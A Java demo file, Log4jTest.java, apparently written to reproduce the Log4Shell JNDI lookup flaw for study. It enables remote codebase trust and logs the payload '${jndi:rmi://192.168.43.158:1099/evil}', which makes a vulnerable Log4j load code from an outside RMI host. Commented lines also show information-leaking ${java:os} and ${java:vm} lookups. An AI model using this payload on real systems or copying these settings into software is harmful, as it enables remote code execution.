/*
 * Copyright (C), 2002-2021, moon-zhou
 * FileName: CommonResult.java
 * Author:   moon-zhou
 * Email:    ayimin1989@163.com
 * Date:     2021/5/7 16:27
 * Description: //模块目的、功能描述
 * History: //修改记录
 * <author>      <time>      <version>    <desc>
 * 修改人姓名    修改时间    版本号       描述
 */
package org.moonzhou.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 功能描述: log4j使用类<br>
 * JAVA Lookup的功能：<link>https://logging.apache.org/log4j/2.x/manual/lookups.html</link>
 *
 * @author moon-zhou
 * @see [相关类/方法]（可选）
 * @since [产品/模块版本] （可选）
 */
public class Log4jTest {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");


        String username = "${jndi:rmi://192.168.43.158:1099/evil}";

        // 异常输出示例：hello, Windows 10 10.0, architecture: amd64-64!
//        String username = "${java:os}";

        // 异常输出示例：hello, Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode)!
//        String username = "${java:vm}";

        // 正常用例输出
//        String username = "normal result";

        LOGGER.info("hello, {}!", username);

    }

}
